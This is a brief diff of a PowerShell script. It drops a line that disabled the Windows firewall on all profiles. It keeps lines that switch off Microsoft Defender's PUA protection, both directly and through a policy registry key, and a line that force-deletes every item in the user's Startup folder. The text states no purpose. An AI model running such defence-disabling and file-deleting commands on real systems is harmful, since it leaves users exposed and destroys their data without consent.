@@ -1,4 +1,3 @@
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Set-MpPreference -PUAProtection 0
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'PUAProtection' -Value 0
 Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force
